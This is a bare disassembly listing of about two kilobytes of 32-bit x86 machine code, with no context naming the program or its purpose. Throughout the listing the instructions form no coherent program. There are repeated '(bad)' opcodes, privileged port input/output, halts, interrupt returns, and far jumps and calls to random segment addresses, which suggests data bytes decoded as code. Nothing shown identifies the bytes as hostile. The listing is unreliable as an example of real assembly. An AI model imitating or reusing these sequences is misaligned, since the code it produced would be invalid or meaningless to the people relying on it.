  4171b7:	fimul  DWORD PTR [esp+ebp*2+0x20d2afe4]
  4171be:	cdq    
  4171bf:	test   eax,0x28515b88
  4171c4:	jmp    0x4bbb:0x7e5d79d7
  4171cb:	inc    edi
  4171cc:	cmp    al,0xe2
  4171cf:	and    eax,0xaa1d6097
  4171d5:	push   0x66
  4171d7:	mov    ds,edx
  4171d9:	loopne 0x417166
  4171db:	dec    ebx
  4171dc:	dec    ebp
  4171dd:	mov    ebx,fs
  4171df:	mov    ?,WORD PTR [bx]
  4171e2:	add    DWORD PTR [edx+0x7f],esp
  4171e5:	out    0x6a,al
  4171e7:	in     al,0x98
  4171e9:	mov    edx,DWORD PTR [eax-0x6edcb3]
  4171ef:	call   0xdcbe:0x50f5a678
  4171f6:	fist   DWORD PTR [ebx]
  4171f8:	jno    0x4171c6
  4171fa:	lods   al,BYTE PTR ds:[esi]
  4171fb:	cmp    DWORD PTR [ecx-0x3208c598],edi
  417201:	daa    
  417202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417203:	out    dx,al
  417204:	dec    ecx
  417205:	jo     0x417284
  417207:	pop    esp
  417208:	inc    edi
  417209:	mov    eax,DWORD PTR [ebx+edx*1+0xfb4251b]
  417210:	and    bl,BYTE PTR [eax+0x14]
  417213:	imul   ecx,DWORD PTR [edx-0x4b],0xcd2223c1
  41721a:	aad    0xa0
  41721c:	jmp    0x417261
  41721e:	(bad)  
  41721f:	mov    ch,0xc3
  417221:	cdq    
  417222:	(bad)  
  417223:	cmp    DWORD PTR [eax+0x22],esp
  417226:	leave  
  417227:	sti    
  417228:	fs repz sbb al,0xcb
  41722c:	xchg   dl,ah
  41722e:	cmp    bh,BYTE PTR [eax+0x336318d4]
  417234:	outs   dx,DWORD PTR ds:[esi]
  417235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417236:	inc    edx
  417237:	xchg   ebx,eax
  417238:	inc    edx
  417239:	mov    bl,0x55
  41723b:	outs   dx,BYTE PTR ds:[esi]
  41723c:	mul    DWORD PTR [ecx]
  41723e:	fild   WORD PTR [edi+0x33f7583d]
  417244:	adc    esp,ecx
  417246:	fcomp  st(5)
  417248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417249:	mov    ch,0x49
  41724b:	xlat   BYTE PTR ds:[ebx]
  41724c:	cwde   
  41724d:	hlt    
  41724e:	call   0x66f7:0x8a2c6c4f
  417255:	pop    edi
  417256:	int    0x84
  417258:	xchg   BYTE PTR [edi],bl
  41725a:	fiadd  DWORD PTR [edi]
  41725c:	push   esp
  41725d:	sbb    al,0x2e
  41725f:	push   ss
  417260:	or     bl,BYTE PTR [ebp-0x31]
  417263:	jns    0x4172d7
  417265:	js     0x417227
  417267:	loope  0x4172ac
  417269:	and    eax,0x5a421a1b
  41726e:	jae    0x417259
  417270:	pop    ds
  417271:	scas   eax,DWORD PTR es:[edi]
  417272:	mov    edx,0x962fc561
  417277:	pop    ebx
  417278:	cmp    edi,eax
  41727a:	and    al,0xdf
  41727c:	jecxz  0x4171ff
  41727e:	fdivr  QWORD PTR [ecx-0x5a]
  417281:	xchg   esi,eax
  417282:	aaa    
  417283:	into   
  417284:	dec    eax
  417285:	fistp  DWORD PTR [esi+0x5c]
  417288:	mov    bl,0xe5
  41728a:	and    eax,0x2ebeb2eb
  417290:	jnp    0x417285
  417292:	ins    DWORD PTR es:[edi],dx
  417293:	ins    DWORD PTR es:[edi],dx
  417294:	mov    ds:0xdaf9e9c,al
  417299:	adc    BYTE PTR [ebx-0x338fd21c],0xdb
  4172a0:	jmp    0x41726a
  4172a2:	not    BYTE PTR [ebp-0x58]
  4172a5:	je     0x4172cb
  4172a7:	jle    0x417266
  4172a9:	or     ah,ch
  4172ab:	mov    al,ds:0x5aa50fb4
  4172b0:	or     bl,BYTE PTR ds:0x5c5d8d2a
  4172b6:	push   ecx
  4172b7:	pusha  
  4172b8:	iret   
  4172b9:	cdq    
  4172ba:	inc    ecx
  4172bb:	test   DWORD PTR [ebx+0x8],edi
  4172be:	scas   eax,DWORD PTR es:[edi]
  4172bf:	xchg   bl,al
  4172c1:	sub    al,0x71
  4172c3:	mov    bl,0xf4
  4172c5:	stos   DWORD PTR es:[edi],eax
  4172c6:	test   ebx,0x1979bc3a
  4172cc:	xlat   BYTE PTR ds:[ebx]
  4172cd:	and    eax,0xb79ea6e
  4172d2:	(bad)  
  4172d3:	add    BYTE PTR [edx],bh
  4172d5:	test   al,0x6a
  4172d7:	into   
  4172d8:	dec    ebx
  4172d9:	jp     0x4172d7
  4172db:	or     BYTE PTR [ebp+0x22],bl
  4172de:	sahf   
  4172df:	pop    ebx
  4172e0:	dec    edx
  4172e1:	outs   dx,DWORD PTR ds:[esi]
  4172e2:	cdq    
  4172e3:	imul   ecx,ecx,0xffffffb2
  4172e6:	push   ebx
  4172e7:	dec    esi
  4172e8:	lea    eax,[edx]
  4172ea:	push   ebp
  4172eb:	inc    ebx
  4172ec:	(bad)  
  4172ee:	push   0xd
  4172f0:	test   DWORD PTR [edi+esi*2-0x6998b773],0x2c132995
  4172fb:	fisubr WORD PTR [edi-0x3e]
  4172fe:	rcl    DWORD PTR [ebx+0xbbd2de1],cl
  417304:	mov    ah,0xb
  417306:	sub    eax,edx
  417308:	push   0xffffffcd
  41730a:	mov    edx,0x6e4fc641
  41730f:	adc    BYTE PTR [eax+ecx*1],dl
  417312:	inc    ebx
  417313:	test   al,0x8a
  417315:	mov    ds:0xede9c105,eax
  41731a:	adc    DWORD PTR ds:0x7661ba00,edi
  417320:	cmp    eax,DWORD PTR [ebx]
  417322:	icebp  
  417323:	dec    edx
  417324:	or     ecx,DWORD PTR ds:0x95d2d7aa
  41732a:	mov    ds:0x55585868,eax
  41732f:	rol    edi,0xe
  417332:	pop    esp
  417333:	pop    ebp
  417334:	loope  0x41733d
  417336:	xlat   BYTE PTR ds:[ebx]
  417337:	fisttp WORD PTR [edi-0x3b09d566]
  41733d:	popa   
  41733e:	lea    esp,[ebx+0x6c]
  417341:	lds    ecx,FWORD PTR ds:[ecx-0x46df9e49]
  417348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417349:	(bad)  
  41734a:	repz pop ebx
  41734c:	or     eax,0xd8d0cd01
  417351:	imul   edi,DWORD PTR [ecx+0xd6ef5c7],0x9688df02
  41735b:	inc    edi
  41735c:	jmp    0x417321
  41735e:	or     BYTE PTR [ebx+edx*4+0x7d],dh
  417362:	leave  
  417363:	mov    edx,0xbbec0fd3
  417368:	int3   
  417369:	pop    esi
  41736a:	xchg   BYTE PTR [eax],ch
  41736c:	inc    eax
  41736d:	fwait
  41736e:	mov    dl,0x51
  417370:	rcl    DWORD PTR [eax-0x23],1
  417373:	and    DWORD PTR [eax+0x44],edx
  417376:	inc    esi
  417377:	adc    BYTE PTR [ebx],bl
  417379:	jne    0x41733c
  41737b:	test   eax,0x24cc6b2c
  417380:	push   edx
  417381:	fadd   DWORD PTR [edx+0x3cd56c02]
  417387:	fcomp  QWORD PTR [esi+0x2c]
  41738a:	xchg   eax,ebx
  41738c:	retf   0x9a2e
  41738f:	addr16 loopne 0x417404
  417392:	fisubr WORD PTR [eax+0x108bfb1e]
  417398:	js     0x4173ec
  41739a:	or     DWORD PTR [edx+0x7828963f],esi
  4173a0:	cmp    BYTE PTR [edi+0x1d],0x1
  4173a4:	xchg   esp,eax
  4173a5:	into   
  4173a6:	dec    esp
  4173a7:	adc    cl,BYTE PTR [esi+0x1c]
  4173aa:	sub    BYTE PTR [ebp-0x6f633017],bl
  4173b0:	adc    al,0xe4
  4173b2:	adc    DWORD PTR [edi+edx*4-0x1a],esp
  4173b6:	fiadd  WORD PTR [esi]
  4173b8:	cmp    DWORD PTR [eax],ebp
  4173ba:	and    al,0xa
  4173bc:	mov    ds:0x489621eb,eax
  4173c1:	scas   al,BYTE PTR es:[edi]
  4173c2:	pushfw 
  4173c4:	or     BYTE PTR [ecx],cl
  4173c6:	fidivr DWORD PTR fs:[ebp+0x5d]
  4173ca:	pop    ss
  4173cb:	or     DWORD PTR [ebp-0x24],edi
  4173ce:	inc    esp
  4173cf:	push   si
  4173d1:	es add edi,esi
  4173d4:	arpl   WORD PTR [edi-0x25a5bce2],bx
  4173da:	out    dx,al
  4173db:	mov    cl,0xae
  4173dd:	xchg   edx,eax
  4173de:	and    DWORD PTR [ebx+0x5ccea660],0x53
  4173e5:	fwait
  4173e6:	push   edx
  4173e7:	in     eax,0x4e
  4173e9:	add    esp,ecx
  4173eb:	rcl    BYTE PTR [edi+0x14117b0f],1
  4173f1:	(bad)  
  4173f2:	dec    ebx
  4173f3:	adc    DWORD PTR [bp+si-0x74],ebp
  4173f7:	and    eax,0x31f0d596
  4173fc:	add    bl,BYTE PTR [edx+eiz*1+0x251c39db]
  417403:	pushf  
  417404:	call   0xa78ce723
  417409:	fstp   QWORD PTR [edi-0x5f]
  41740c:	iret   
  41740d:	js     0x417430
  41740f:	inc    edx
  417410:	mov    eax,ds:0xe79ac540
  417415:	loope  0x4173f1
  417417:	cmp    al,0x5b
  417419:	stos   DWORD PTR es:[edi],eax
  41741a:	fsubr  QWORD PTR [edi+0x47]
  41741d:	mov    ds:0x2ff29999,al
  417422:	add    al,0x39
  417424:	arpl   WORD PTR ds:[eax+0x5e],si
  417428:	mov    bh,0x57
  41742a:	cmp    dh,BYTE PTR [edi]
  41742c:	aas    
  41742d:	push   es
  41742e:	dec    edx
  41742f:	ds jecxz 0x41741a
  417432:	jbe    0x4174ad
  417434:	mov    ecx,0xcfd9214d
  417439:	jl     0x41744d
  41743b:	pop    es
  41743c:	jae    0x41748b
  41743e:	div    bh
  417440:	stc    
  417441:	dec    esp
  417442:	ss cli 
  417444:	push   0xf32bfbb2
  417449:	xchg   BYTE PTR [edx],ah
  41744b:	jl     0x417474
  41744d:	xor    dl,BYTE PTR [eax]
  41744f:	cdq    
  417450:	and    DWORD PTR [edi-0x6ccb2171],ebp
  417456:	fnstsw WORD PTR [eax-0x20]
  417459:	mov    DWORD PTR [eax-0x16],0x2210e94a
  417460:	cmp    eax,0x68626ed5
  417465:	stos   DWORD PTR es:[edi],eax
  417466:	hlt    
  417467:	test   eax,0x215c27fc
  41746c:	pop    esi
  41746d:	ja     0x4174a5
  41746f:	dec    ebx
  417470:	rcl    DWORD PTR [esi],0x33
  417473:	push   0xc098130a
  417478:	mov    esp,0xe2068ecb
  41747d:	mov    bl,0x18
  41747f:	sub    ch,BYTE PTR [esi]
  417481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417482:	cpuid  
  417484:	into   
  417485:	inc    ebp
  417486:	retf   0x46fe
  417489:	jle    0x417495
  41748b:	rol    DWORD PTR [ebp+0x6a94a182],cl
  417491:	lahf   
  417492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417493:	push   ebx
  417494:	sbb    ecx,ebx
  417496:	add    DWORD PTR [esi],0x32
  417499:	jns    0x4174ac
  41749b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41749c:	mov    esp,0x93c2c377
  4174a1:	xchg   ebx,eax
  4174a2:	sub    bl,dl
  4174a4:	sbb    DWORD PTR [ecx],edi
  4174a6:	pop    edx
  4174a7:	jle    0x417525
  4174a9:	push   esp
  4174aa:	in     eax,0x76
  4174ac:	jmp    0x5f6c:0xe1244bad
  4174b3:	inc    edi
  4174b4:	mov    eax,0x5a1150de
  4174b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ba:	test   DWORD PTR [ebp+0x20],eax
  4174bd:	sub    DWORD PTR [edi-0x46],esi
  4174c0:	test   BYTE PTR [eiz*4+0x68b7178e],dh
  4174c7:	and    eax,DWORD PTR [eax-0x2a95173f]
  4174cd:	and    BYTE PTR [esi-0x4bf79a3d],bl
  4174d3:	jge    0x41752e
  4174d5:	xor    bh,BYTE PTR [esp+edi*8+0x6a9ede44]
  4174dc:	rcr    DWORD PTR [ebx-0x75d30534],cl
  4174e2:	clc    
  4174e3:	aad    0xd5
  4174e5:	adc    eax,0xc1ad5148
  4174ea:	(bad)  
  4174eb:	mov    dl,0xb5
  4174ed:	add    BYTE PTR [ebp+eax*8+0x73936bd3],dh
  4174f4:	dec    ebx
  4174f5:	push   edx
  4174f6:	loope  0x417504
  4174f8:	stos   DWORD PTR es:[edi],eax
  4174f9:	or     DWORD PTR [ecx+esi*2+0x3b],edi
  4174fd:	push   0x416baffe
  417502:	inc    edx
  417503:	cli    
  417504:	aaa    
  417505:	sub    BYTE PTR [edi+0x20de50d3],ch
  41750b:	retf   
  41750c:	dec    edi
  41750d:	clc    
  41750e:	push   0xffffffcd
  417510:	pop    es
  417511:	lea    ecx,[esi-0xd628f76]
  417517:	jecxz  0x417576
  417519:	fwait
  41751a:	or     eax,0xafd137c
  41751f:	jg     0x4174c3
  417521:	pop    edx
  417522:	outs   dx,DWORD PTR ds:[esi]
  417523:	shl    DWORD PTR [ebx-0x24],cl
  417526:	xchg   DWORD PTR [esi-0x6da24371],ecx
  41752c:	jno    0x4174b2
  41752e:	out    dx,al
  41752f:	popa   
  417530:	stc    
  417531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417532:	jns    0x4174b8
  417534:	aam    0xda
  417536:	jle    0x417597
  417538:	call   0x9d67c125
  41753d:	and    edi,0xb98dad98
  417543:	cld    
  417544:	bnd jae 0x4175b6
  417547:	shl    BYTE PTR ss:[ecx],cl
  41754a:	aas    
  41754b:	cwde   
  41754c:	out    dx,al
  41754d:	adc    esi,DWORD PTR [edi+edi*1]
  417550:	neg    ecx
  417552:	inc    ebx
  417553:	jmp    0x79c3:0xab9dfd86
  41755a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41755b:	pop    esi
  41755c:	sub    DWORD PTR [esp+ecx*4-0x49],esp
  417560:	sub    eax,0x5cf8033
  417565:	(bad)  
  417566:	mov    ah,0x12
  417568:	daa    
  417569:	push   esi
  41756a:	sbb    al,0x7c
  41756c:	das    
  41756d:	sub    edi,DWORD PTR [ecx+esi*4-0x3de0495e]
  417574:	push   eax
  417575:	(bad)  
  417576:	clc    
  417577:	mov    dh,0x9d
  417579:	cmp    bl,dh
  41757b:	pop    edi
  41757c:	push   esi
  41757d:	lods   al,BYTE PTR ds:[esi]
  41757e:	inc    edx
  41757f:	push   0x80fdd2cb
  417584:	pop    ebx
  417585:	(bad)  
  417586:	iret   
  417587:	mov    esp,0x5297e9c4
  41758c:	loop   0x417525
  41758e:	pop    esp
  41758f:	push   ebx
  417590:	or     eax,0x7c343b77
  417595:	xchg   BYTE PTR [esi],al
  417597:	cld    
  417598:	sub    esi,edx
  41759a:	xchg   DWORD PTR [edi],ecx
  41759c:	xchg   esp,eax
  41759d:	mov    dh,0xcc
  41759f:	das    
  4175a0:	jnp    0x417599
  4175a2:	mov    BYTE PTR [ecx+0x3c],bl
  4175a5:	fisttp WORD PTR [ecx]
  4175a7:	(bad)  
  4175a9:	ret    0xa888
  4175ac:	mov    edx,0xaae0fdae
  4175b1:	mov    edx,0xeedb60d5
  4175b6:	ret    
  4175b7:	pop    ecx
  4175b8:	mov    dl,0x56
  4175ba:	stos   BYTE PTR es:[edi],al
  4175bb:	sbb    ah,cl
  4175bd:	pop    eax
  4175be:	ds ins DWORD PTR es:[edi],dx
  4175c0:	mov    ch,0xa9
  4175c2:	jne    0x4175fa
  4175c4:	imul   ebx,DWORD PTR [ebp+0x17],0xffffffed
  4175c8:	add    esp,ecx
  4175ca:	jne    0x417643
  4175cc:	mov    ah,0x19
  4175ce:	pop    eax
  4175cf:	xchg   ebx,eax
  4175d0:	jle    0x4175c4
  4175d2:	adc    dh,BYTE PTR [edx+ebp*4+0x3416e3aa]
  4175d9:	jnp    0x41761c
  4175db:	fldcw  WORD PTR [ecx]
  4175dd:	lds    ebx,FWORD PTR [ebx]
  4175df:	mov    ebp,0x1081bb44
  4175e4:	in     eax,0x2b
  4175e6:	retf   0xf844
  4175e9:	adc    al,0xa0
  4175eb:	or     cl,BYTE PTR [esi-0x69]
  4175ee:	push   ebp
  4175ef:	cmp    ebp,0x61
  4175f2:	sub    eax,0xdcc58de
  4175f7:	or     ebx,0xffffffb2
  4175fa:	mov    dh,0x71
  4175fc:	mov    ds,ebp
  4175fe:	sub    BYTE PTR cs:[ecx+0x6d],ch
  417602:	adc    esp,eax
  417604:	ins    DWORD PTR es:[edi],dx
  417605:	adc    BYTE PTR [ecx-0x7eed4154],ch
  41760b:	dec    ecx
  41760c:	push   ecx
  41760d:	jle    0x417590
  41760f:	(bad)  
  417610:	sub    dl,ch
  417612:	dec    edx
  417613:	fwait
  417614:	adc    ch,0xa0
  417617:	or     BYTE PTR [esi-0x44],bh
  41761a:	(bad)  
  41761b:	rcl    BYTE PTR [edi+0xd],cl
  41761e:	repnz cmp cl,bh
  417621:	jns    0x417624
  417623:	jmp    ebx
  417625:	mov    eax,ds:0xbce2c825
  41762a:	jl     0x417650
  41762c:	test   al,0xd7
  41762e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41762f:	in     al,dx
  417630:	or     BYTE PTR [ebp+0x1fc2d7ed],ch
  417636:	fcom   DWORD PTR [edx]
  417638:	jmp    0xacb9dfb9
  41763d:	std    
  41763e:	mov    ah,0x90
  417640:	call   0x8e9fd106
  417645:	je     0x4175d1
  417647:	xor    DWORD PTR [eax],esi
  417649:	call   0xb583:0x9b881ca3
  417650:	lea    ecx,[ebx-0x66]
  417653:	fisub  WORD PTR ds:0x1595b030
  417659:	inc    ebx
  41765a:	(bad)  
  41765b:	sub    al,0xc7
  41765d:	lahf   
  41765e:	jne    0x4175fd
  417660:	and    BYTE PTR [eax+0x49],dl
  417663:	inc    eax
  417664:	fcom   DWORD PTR ds:0xdbc8310a
  41766a:	repnz fdiv QWORD PTR ds:0x946f6648
  417671:	repz fcomp DWORD PTR [edx-0x24fef11e]
  417678:	(bad)  
  417679:	fcmovbe st,st(2)
  41767b:	es in  eax,dx
  41767d:	fwait
  41767e:	mov    ds:0x8e20bd8a,al
  417683:	pusha  
  417684:	aad    0x35
  417686:	push   esi
  417687:	pop    ss
  417688:	sub    eax,0x4bf6d22d
  41768d:	add    DWORD PTR [ecx+0x40b2313f],esp
  417693:	ja     0x41765d
  417695:	adc    ch,BYTE PTR [ebp+ebx*8+0x3b]
  417699:	hlt    
  41769a:	jbe    0x4176dc
  41769c:	mov    ecx,0xcd8d019c
  4176a1:	or     ecx,edx
  4176a3:	adc    eax,0x31f63df3
  4176a8:	leave  
  4176a9:	or     eax,0xfdd33033
  4176ae:	push   esi
  4176af:	jae    0x4176f0
  4176b1:	out    dx,al
  4176b2:	fst    QWORD PTR [ecx]
  4176b4:	out    0x8b,eax
  4176b6:	push   ecx
  4176b7:	push   0xffffffe7
  4176b9:	push   edi
  4176ba:	retf   0xfbee
  4176bd:	lahf   
  4176be:	push   edi
  4176bf:	push   edi
  4176c0:	dec    edx
  4176c1:	mov    dl,0xd1
  4176c3:	sub    BYTE PTR [ecx+0x3b],ch
  4176c6:	out    dx,eax
  4176c7:	frstor [edi+0x6]
  4176ca:	mov    dl,0xd6
  4176cc:	cmp    ebx,edx
  4176ce:	mov    ds:0x81fde329,al
  4176d3:	adc    eax,0x46a88b9
  4176d8:	sar    DWORD PTR [ebx+ebp*4],0xe1
  4176dc:	mov    ds:0x8a960dad,al
  4176e1:	in     eax,0xe8
  4176e3:	icebp  
  4176e4:	xor    dl,ch
  4176e6:	pop    ebp
  4176e7:	jns    0x4176a4
  4176e9:	jmp    0xabdd:0x4efb7bfa
  4176f0:	sbb    al,0x31
  4176f2:	sbb    DWORD PTR [edi-0x36b64849],edi
  4176f8:	ds pop ebx
  4176fa:	imul   eax,ecx,0x2b95cb4f
  417700:	and    DWORD PTR [ebx+0x406f22b],esp
  417706:	stc    
  417707:	cwde   
  417708:	sub    al,0x72
  41770a:	loope  0x417744
  41770c:	out    dx,al
  41770d:	or     esp,DWORD PTR [esp+edi*4-0x4d]
  417711:	mov    al,0x4a
  417713:	adc    ebp,DWORD PTR [ebx-0x27]
  417716:	mov    esi,0x4281e8b
  41771b:	mov    edx,0xe5fd5d7a
  417720:	cmp    BYTE PTR [edi],dh
  417722:	sub    BYTE PTR [edi-0x36f7abc9],cl
  417728:	mov    edi,0x4b850413
  41772d:	clc    
  41772e:	(bad)
  417731:	int    0x66
  417733:	sbb    eax,eax
  417735:	out    dx,al
  417736:	mov    bh,BYTE PTR [ebp+0x6057fbff]
  41773c:	dec    edi
  41773d:	shl    BYTE PTR [ecx+ebp*4],cl
  417740:	mov    ah,0xf8
  417742:	cli    
  417743:	repnz dec edx
  417745:	mov    ebp,0xc9044fab
  41774a:	cld    
  41774b:	mov    WORD PTR [ecx+eiz*4-0x2f6701b3],?
  417752:	rcl    BYTE PTR [ebx+0x21],0x2d
  417756:	push   ss
  417757:	push   eax
  417758:	test   BYTE PTR [edx+esi*8+0x2f679238],bl
  41775f:	sbb    al,0xd2
  417761:	sub    ch,BYTE PTR [esi+0x2a48e7d7]
  417767:	shr    DWORD PTR [ecx+eax*4],1
  41776a:	pop    edx
  41776b:	xor    cl,bh
  41776d:	out    0xe3,al
  41776f:	pop    ebp
  417770:	jmp    0x96cc1d40
  417775:	mov    edx,esi
  417777:	mov    dh,0x71
  417779:	(bad)  
  41777a:	cmp    BYTE PTR [ebx+0x73361cad],al
  417780:	arpl   WORD PTR [eax],si
  417782:	(bad)  
  417783:	and    eax,0xfeec7389
  417788:	stos   DWORD PTR es:[edi],eax
  417789:	mov    dl,0x4a
  41778b:	fwait
  41778c:	cmc    
  41778d:	shl    DWORD PTR [esi+eax*4-0x31c0cd38],0x77
  417795:	jmp    0x538255ac
  41779a:	xor    eax,0xb9aec06
  41779f:	or     DWORD PTR [eax],ebp
  4177a1:	outs   dx,BYTE PTR ds:[esi]
  4177a2:	and    al,0xb8
  4177a4:	sub    al,0x61
  4177a6:	fwait
  4177a7:	outs   dx,BYTE PTR ds:[esi]
  4177a8:	les    eax,FWORD PTR [edi-0x42]
  4177ab:	mov    esi,0x664c6774
  4177b0:	sahf   
  4177b1:	iret   
  4177b2:	add    eax,0x3f3d6b07
  4177b7:	scas   eax,DWORD PTR es:[edi]
  4177b8:	jge    0x4177d0
  4177ba:	rep lods eax,DWORD PTR ds:[esi]
  4177bc:	pop    es
  4177bd:	xchg   edx,eax
  4177be:	pop    ecx
  4177bf:	jmp    0x41780d
  4177c1:	or     al,0x2d
  4177c3:	(bad)  
  4177c4:	dec    ecx
  4177c5:	jmp    0x4177c4
  4177c7:	adc    DWORD PTR [ecx-0x53],ebp
  4177ca:	xchg   ebp,eax
  4177cb:	hlt    
  4177cc:	sar    esi,1
  4177ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177cf:	sub    al,0x28
  4177d1:	jecxz  0x417833
  4177d3:	jne    0x4177fb
  4177d5:	xor    eax,0x5454c478
  4177da:	jno    0x417762
  4177dc:	inc    edi
  4177dd:	mov    dh,BYTE PTR [eax]
  4177df:	xchg   ecx,eax
  4177e0:	sbb    edx,DWORD PTR [eax-0x75]
  4177e3:	dec    edx
  4177e4:	retf   
  4177e5:	xchg   BYTE PTR [esi-0x493e0b2e],bh
  4177eb:	sbb    al,0x36
  4177ed:	gs fincstp 
  4177f0:	pusha  
  4177f1:	fcom   DWORD PTR [edx]
  4177f3:	loope  0x4177d4
  4177f5:	push   ds
  4177f6:	or     eax,0xa22baa78
  4177fb:	mov    al,0xf6
  4177fd:	dec    ebp
  4177fe:	xor    BYTE PTR [eax+edi*4-0x225d7179],0x29
  417806:	rcr    BYTE PTR [ebp-0x69],1
  417809:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41780b:	xchg   edi,eax
  41780c:	pop    ss
  41780d:	pusha  
  41780e:	adc    ch,BYTE PTR [edx-0x3960d576]
  417814:	lods   al,BYTE PTR ds:[esi]
  417815:	loopne 0x41782b
  417817:	mov    al,0xee
  417819:	sub    al,0xe3
  41781b:	js     0x417885
  41781d:	fwait
  41781e:	in     al,dx
  41781f:	repz dec ebx
  417821:	add    eax,0xfc12c6ce
  417826:	in     al,0xe2
  417828:	fcmovnu st,st(2)
  41782a:	sub    dl,dl
  41782c:	jb     0x417819
  41782e:	inc    eax
  41782f:	int    0x9a
  417831:	das    
  417832:	jl     0x4178a8
  417834:	cmp    BYTE PTR [ebx-0x80],al
  417837:	mov    ds,WORD PTR [ebp+0x47bfbede]
  41783d:	sub    ebp,DWORD PTR ds:0x78a6df0e
  417843:	psrlw  mm5,mm4
  417846:	aas    
  417847:	int3   
  417848:	neg    al
  41784a:	add    edx,DWORD PTR [eax+esi*4]
  41784d:	mov    ebx,0xf0b495d5
  417852:	jmp    0x79fb:0xfe562a5b
  417859:	scas   eax,DWORD PTR es:[edi]
  41785a:	push   0xe
  41785c:	cwde   
  41785d:	add    eax,0x8dd8d1e3
  417862:	in     eax,dx
  417863:	cmp    dl,dl
  417865:	hlt    
  417866:	sub    al,bh
  417868:	jl     0x41783f
  41786a:	mov    cl,0x86
  41786c:	fdiv   DWORD PTR [edi+edx*4+0x729bea11]
  417873:	pusha  
  417874:	mov    bl,0x9f
  417876:	jg     0x417850
  417878:	xor    bl,BYTE PTR [esi+0x677d18c6]
  41787e:	cld    
  41787f:	ja     0x417859
  417881:	leave  
  417882:	mov    bh,0x0
  417884:	pop    ecx
  417885:	sub    al,0x51
  417887:	shr    bl,1
  417889:	fmul   QWORD PTR [edx+0xab7387]
  41788f:	add    eax,0x8fb14e2c
  417894:	mov    ebp,0x684bc35
  417899:	ret    0xea30
  41789c:	sbb    edx,0xad046d6d
  4178a2:	shr    esp,1
  4178a4:	retf   
  4178a5:	sbb    BYTE PTR [eax],bl
  4178a7:	inc    esp
  4178a8:	cmp    bh,bl
  4178aa:	xor    ah,ah
  4178ac:	lea    ebx,fs:0x3e3b9ddd
  4178b3:	addr16 ja 0x417881
  4178b6:	push   esp
  4178b7:	xor    ah,BYTE PTR [edx-0x3c]
  4178ba:	jecxz  0x417854
  4178bc:	push   cs
  4178bd:	xchg   BYTE PTR [ecx+0x6b],dl
  4178c0:	daa    
  4178c1:	jbe    0x41788a
  4178c3:	cmp    BYTE PTR [edi],0xaf
  4178c6:	ror    BYTE PTR [edi+0x6c],cl
  4178c9:	shl    edx,0x5
  4178cc:	enter  0x14a7,0x49
  4178d0:	pop    esi
  4178d1:	push   ebx
  4178d2:	out    0x70,eax
  4178d4:	scas   eax,DWORD PTR es:[edi]
  4178d5:	adc    DWORD PTR [esi+0x34],0x4b548056
  4178dc:	mov    WORD PTR [edi],gs
  4178de:	enter  0xdca9,0x79
  4178e2:	pop    esi
  4178e3:	jmp    0xf310f81a
  4178e8:	rcr    BYTE PTR [edi],0x49
  4178eb:	sbb    eax,0x5ce878ac
  4178f0:	mov    bl,0x4e
  4178f2:	mov    BYTE PTR [edx+0x7b],dl
  4178f5:	cwde   
  4178f6:	popa   
  4178f7:	mov    dh,0x63
  4178f9:	xchg   BYTE PTR [edx-0x474dbb91],cl
  4178ff:	adc    BYTE PTR [eax],cl
  417901:	stos   DWORD PTR es:[edi],eax
  417902:	ins    DWORD PTR es:[edi],dx
  417903:	cmp    ebp,edx
  417905:	popf   
  417906:	mov    al,ds:0xeb31ef9
  41790b:	retf   0xe957
  41790e:	push   ebp
  41790f:	loop   0x417899
  417911:	mov    ah,0xbb
  417913:	data16 aad 0xd5
  417916:	fcom   DWORD PTR [ebp+0xf]
  417919:	jae    0x4178ee
  41791b:	mov    edi,0x678f092f
  417920:	or     al,0x40
  417922:	push   0x7e
  417924:	lea    esp,[eax]
  417926:	rcr    BYTE PTR [ebp+edx*8-0x542e761b],1
  41792d:	pop    es
  41792e:	mov    ah,0x9b
  417930:	fild   QWORD PTR [esi-0x170afbac]
  417937:	out    dx,al
  417938:	sbb    ah,BYTE PTR [edi-0x76e8d453]
  41793e:	or     bl,BYTE PTR [edx+ebp*8]
  417941:	cs ds jno 0x417945
  417945:	sbb    al,0x60
  417947:	add    BYTE PTR [ebp*4+0x7320d359],bh
  41794e:	pop    es
  41794f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417950:	test   DWORD PTR [edx+0x63ec1cee],ecx
  417956:	les    ebp,FWORD PTR [esi-0x13]
  417959:	test   BYTE PTR [eax-0x5],bh
  41795c:	jae    0x41794c
  41795e:	or     al,0x98
  417960:	out    0x65,eax
  417962:	fs cmp bl,al
  417965:	pop    ebp
  417966:	lods   al,BYTE PTR ds:[esi]
  417967:	daa    
  417968:	sbb    ebp,DWORD PTR [esi]
  41796a:	ds sbb edx,edi
  41796d:	nop
  41796e:	push   edx
  41796f:	loopne 0x417966
  417971:	cmc    
  417972:	ins    BYTE PTR es:[edi],dx
  417973:	xor    esp,ecx
  417975:	mov    ecx,0xeb3a9ee2
  41797a:	fmul   st(4),st
  41797c:	and    dl,BYTE PTR [eax+0x7632529c]
  417982:	call   0xaf56:0x62cb284f
  417989:	xor    al,0x56
  41798b:	test   BYTE PTR [edx+0x3c71e6ae],bl
  417991:	ret    0xa827
  417994:	cmc    
  417995:	adc    BYTE PTR [esi+0x36280364],0xd
  41799c:	jg     0x4179ae
  41799e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41799f:	vdivsd xmm5,xmm2,QWORD PTR [esi]
  4179a3:	lock or DWORD PTR [eax+eiz*8+0x6b],ebp
  4179a8:	cmp    eax,0x22089404
  4179ad:	lods   eax,DWORD PTR ds:[esi]
  4179ae:	xor    DWORD PTR [eax+0x3b],esi
  4179b1:	stos   BYTE PTR es:[edi],al
  4179b2:	out    0x91,al
  4179b4:	test   eax,0xd5923f11
